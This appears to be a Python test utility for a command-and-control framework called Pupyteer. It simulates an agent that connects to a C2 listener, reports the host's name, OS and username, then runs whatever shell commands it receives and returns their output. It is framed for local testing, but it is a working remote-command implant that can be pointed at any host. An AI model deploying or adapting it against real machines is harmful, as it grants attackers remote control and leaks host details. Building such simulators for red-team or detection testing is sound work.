"""Agent simulator — simulates a Pupyteer agent callback for testing.

Connects to a Pupyteer TCP listener, registers a session, enters a check-in
loop, executes received commands locally via subprocess, and returns output.

Usage:
    python -m pupyteer.tools.agent_simulator --host 127.0.0.1 --port 8443
"""
from __future__ import annotations

import argparse
import asyncio
import json
import logging
import os
import platform
import signal
import subprocess
import sys
import time
import uuid
from typing import Any, Dict, Optional

logger = logging.getLogger("pupyteer.agent_simulator")


class AgentSimulator:
    """Simulates a Pupyteer agent that connects back to a C2 listener."""

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 8443,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
        agent_version: str = "1.0.0-sim",
        checkin_interval: float = 2.0,
        max_checkins: int = 10,
    ):
        self._host = host
        self._port = port
        self._hostname = hostname or platform.node() or "sim-host"
        self._username = username or os.environ.get("USER", "sim-user")
        self._agent_version = agent_version
        self._checkin_interval = checkin_interval
        self._max_checkins = max_checkins
        self._session_id: Optional[str] = None
        self._running = False
        self._commands_executed: list = []

    @property
    def session_id(self) -> Optional[str]:
        return self._session_id

    @property
    def commands_executed(self) -> list:
        return list(self._commands_executed)

    async def run(self) -> None:
        """Main entry point: connect, register, and enter check-in loop."""
        self._running = True
        logger.info("Connecting to %s:%d", self._host, self._port)

        try:
            reader, writer = await asyncio.open_connection(self._host, self._port)
        except (ConnectionError, OSError) as exc:
            logger.error("Failed to connect: %s", exc)
            return

        try:
            # Step 1: Register
            if not await self._register(writer, reader):
                logger.error("Registration failed")
                return

            # Step 2: Enter check-in loop
            checkin_count = 0
            while self._running and checkin_count < self._max_checkins:
                checkin_count += 1
                commands = await self._checkin(writer, reader)

                if commands:
                    for cmd in commands:
                        await self._execute_and_report(cmd, writer, reader)

                if self._running:
                    await asyncio.sleep(self._checkin_interval)

        except (ConnectionError, OSError) as exc:
            logger.error("Connection error: %s", exc)
        except asyncio.CancelledError:
            pass
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            logger.info("Agent simulator disconnected")

    async def stop(self) -> None:
        """Signal the agent to stop after current operation."""
        self._running = False

    async def _register(
        self, writer: asyncio.StreamWriter, reader: asyncio.StreamReader
    ) -> bool:
        """Send registration message and parse response."""
        reg_msg = {
            "type": "register",
            "hostname": self._hostname,
            "os": platform.system().lower(),
            "arch": platform.machine(),
            "username": self._username,
            "agent_version": self._agent_version,
        }

        await self._send_json(writer, reg_msg)
        response = await self._read_json(reader)

        if response and response.get("type") == "registered":
            self._session_id = response.get("session_id")
            logger.info("Registered as session %s", self._session_id)
            return True

        logger.error("Registration failed: %s", response)
        return False

    async def _checkin(
        self, writer: asyncio.StreamWriter, reader: asyncio.StreamReader
    ) -> list:
        """Send check-in and return any queued commands."""
        if not self._session_id:
            return []

        checkin_msg = {
            "type": "checkin",
            "session_id": self._session_id,
        }

        await self._send_json(writer, checkin_msg)
        response = await self._read_json(reader)

        if response and response.get("type") == "commands":
            commands = response.get("commands", [])
            if commands:
                logger.info("Received %d command(s)", len(commands))
            return commands

        logger.warning("Unexpected check-in response: %s", response)
        return []

    async def _execute_and_report(
        self,
        cmd: Dict[str, Any],
        writer: asyncio.StreamWriter,
        reader: asyncio.StreamReader,
    ) -> None:
        """Execute a command locally and send output back."""
        command_id = cmd.get("command_id", "")
        command = cmd.get("command", "")

        logger.info("Executing command %s: %s", command_id, command)

        output = self._execute_command(command)
        self._commands_executed.append({
            "command_id": command_id,
            "command": command,
            "output": output,
        })

        output_msg = {
            "type": "output",
            "session_id": self._session_id,
            "command_id": command_id,
            "output": output,
        }

        await self._send_json(writer, output_msg)
        response = await self._read_json(reader)

        if response and response.get("type") == "ack":
            logger.info("Command %s acknowledged", command_id)
        else:
            logger.warning("Unexpected output response: %s", response)

    @staticmethod
    def _execute_command(command: str) -> str:
        """Execute a command locally via subprocess and return output."""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
            )
            output = result.stdout
            if result.stderr:
                output += result.stderr
            if result.returncode != 0:
                output += f"\n[exit code: {result.returncode}]"
            return output.strip()
        except subprocess.TimeoutExpired:
            return "[error: command timed out]"
        except Exception as exc:
            return f"[error: {exc}]"

    @staticmethod
    async def _send_json(
        writer: asyncio.StreamWriter, payload: Dict[str, Any]
    ) -> None:
        """Serialize payload to JSON and write with trailing newline."""
        data = (json.dumps(payload) + "\n").encode("utf-8")
        writer.write(data)
        await writer.drain()

    @staticmethod
    async def _read_json(reader: asyncio.StreamReader) -> Optional[Dict[str, Any]]:
        """Read a newline-delimited JSON message."""
        try:
            line = await asyncio.wait_for(reader.readline(), timeout=10.0)
            if not line:
                return None
            line_str = line.decode("utf-8", errors="replace").strip()
            if not line_str:
                return None
            return json.loads(line_str)
        except (asyncio.TimeoutError, json.JSONDecodeError):
            return None


async def async_main(args: argparse.Namespace) -> int:
    """Async main entry point."""
    sim = AgentSimulator(
        host=args.host,
        port=args.port,
        hostname=args.hostname,
        username=args.username,
        agent_version=args.version,
        checkin_interval=args.interval,
        max_checkins=args.max_checkins,
    )

    # Handle Ctrl+C gracefully
    loop = asyncio.get_event_loop()

    def _on_sigint():
        asyncio.create_task(sim.stop())

    try:
        loop.add_signal_handler(signal.SIGINT, _on_sigint)
    except (NotImplementedError, RuntimeError):
        pass

    await sim.run()

    if sim.session_id:
        logger.info("Session %s completed. Commands executed: %d",
                     sim.session_id, len(sim.commands_executed))
        return 0
    return 1


def main() -> int:
    """CLI entry point."""
    parser = argparse.ArgumentParser(
        description="Pupyteer agent simulator for testing C2 callbacks"
    )
    parser.add_argument(
        "--host", default="127.0.0.1", help="C2 listener host (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--port", type=int, default=8443, help="C2 listener port (default: 8443)"
    )
    parser.add_argument(
        "--hostname", default=None, help="Agent hostname (default: auto-detect)"
    )
    parser.add_argument(
        "--username", default=None, help="Agent username (default: auto-detect)"
    )
    parser.add_argument(
        "--version", default="1.0.0-sim", help="Agent version string"
    )
    parser.add_argument(
        "--interval", type=float, default=2.0,
        help="Check-in interval in seconds (default: 2.0)"
    )
    parser.add_argument(
        "--max-checkins", type=int, default=10,
        help="Maximum number of check-ins before exit (default: 10)"
    )
    parser.add_argument(
        "--verbose", "-v", action="store_true", help="Enable debug logging"
    )

    args = parser.parse_args()

    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    return asyncio.run(async_main(args))


if __name__ == "__main__":
    sys.exit(main())
